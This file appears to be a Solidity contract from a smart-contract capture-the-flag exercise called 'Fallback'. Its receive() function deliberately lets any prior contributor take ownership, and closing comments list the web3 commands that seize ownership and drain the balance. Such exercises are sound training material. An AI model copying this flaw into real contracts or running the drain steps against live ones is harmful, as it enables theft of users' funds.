// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
    // solution
    // 1. Get new instance
    //await contract.contribute({ value: web3.utils.toWei('0.0001', 'ether') })
    //await contract.getContribution().then(v => v.toString())
    //await web3.eth.sendTransaction({
    //from: player,
    //to: contract.address,
    //value: web3.utils.toWei('0.0001', 'ether')
    //})
    //await contract.owner()
    //await contract.withdraw()
}
